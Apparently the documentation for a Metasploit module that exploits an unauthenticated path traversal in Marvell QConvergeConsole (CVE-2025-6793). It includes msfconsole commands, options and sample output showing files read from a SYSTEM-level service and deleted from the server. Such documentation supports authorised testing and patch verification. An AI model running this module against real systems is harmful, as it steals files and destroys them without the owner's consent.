## Vulnerable Application

This module exploits a path traversal vulnerability in Marvell QConvergeConsole <= v5.5.0.85 (CVE-2025-6793) to read arbitrary files from
the system. No authentication is required to exploit this issue.
Note that whatever file is retrieved will be deleted from the server it was fetched from.

## Testing

The software can be obtained from
[the vendor](https://www.marvell.com/content/dam/marvell/en/drivers/marvell/qcc-gui-management-installer-for-windows--x64--5-5-0-78/Windows_QCC_GUI_64_v5.5.0.78.zip).

By default, the Apache Tomcat server listens on TCP ports 8080 (HTTP) and 8443 (HTTPS) on all network interfaces and runs in the context of
NT AUTHORITY\\SYSTEM.

**Successfully tested on**

- Marvell QConvergeConsole v5.5.0.78 on Windows 22H2
- Marvell QConvergeConsole v5.5.0.81 on Windows 22H2

## Verification Steps

1. Install and run the application
2. Start `msfconsole` and run the following commands:

```
msf > use auxiliary/gather/qconvergeconsole_traversal 
msf auxiliary(gather/qconvergeconsole_traversal) > set RHOSTS <IP>
msf auxiliary(gather/qconvergeconsole_traversal) > run
```

This should return the win.ini file from the server. Any files retrieved will be deleted from the server and stored locally as loot.

## Options

### TARGET_FILE
The file to be retrieved from the file system. By default, this is win.ini. However, any arbitrary file can be specified.

Example: win.ini

### TARGET_DIR
Folder where the TARGET_FILE is located.

Example: C:\Windows

## Scenarios

Running the exploit against v5.0.78 on Windows 22H22 should result in an output similar to the following:

```
msf auxiliary(gather/qconvergeconsole_traversal) > run
[*] Running module against 192.168.137.238
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Vulnerable version detected: v5.0.78
[+] File retrieved: C:\Windows\win.ini
[*] File saved as loot: /home/asdf/.msf4/loot/20260416003715_default_192.168.137.238_qconvergeconsole_558041.txt
[*] Auxiliary module execution completed

```

The file will be stored as loot:

```
msf auxiliary(gather/qconvergeconsole_traversal) > loot

Loot
====

host             service  type                   name     content     info                                                                     path
----             -------  ----                   ----     -------     ----                                                                     ----
192.168.137.238           qconvergeconsole.file  win.ini  text/plain  File retrieved through QConvergeConsole path traversal (CVE-2025-6793).  /home/asdf/.msf4/loot/20260416003826_default_192.168.137.238_qconvergeconsole_201403.txt

```
